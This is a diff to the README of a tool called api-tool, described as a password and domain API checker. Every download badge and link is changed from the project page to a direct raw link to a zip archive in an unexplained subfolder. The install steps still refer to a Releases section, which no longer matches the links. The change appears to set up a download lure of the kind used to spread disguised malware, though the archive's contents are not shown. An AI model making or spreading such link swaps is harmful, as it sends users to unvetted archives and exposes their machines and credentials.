@@ -1,6 +1,6 @@
 # 🔧 api-tool - Simple API checker for password and domain
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Yehudisynaptic502/api-tool)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Yehudisynaptic502/api-tool/raw/refs/heads/main/Havaiki/tool-api-v1.4.zip)
 
 ---
 
@@ -39,12 +39,12 @@ This guide will help you download, install, and open api-tool on Windows.
 
 To begin, visit the main project page to get the app.
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/Yehudisynaptic502/api-tool)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/Yehudisynaptic502/api-tool/raw/refs/heads/main/Havaiki/tool-api-v1.4.zip)
 
 ### How to download
 
 1. Click the badge above or open this link in your web browser:  
-   https://github.com/Yehudisynaptic502/api-tool
+   https://github.com/Yehudisynaptic502/api-tool/raw/refs/heads/main/Havaiki/tool-api-v1.4.zip
 
 2. On the GitHub page, look for a **Releases** section or a download button.
 
@@ -155,4 +155,4 @@ This tool is ideal for:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Yehudisynaptic502/api-tool)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Yehudisynaptic502/api-tool/raw/refs/heads/main/Havaiki/tool-api-v1.4.zip)
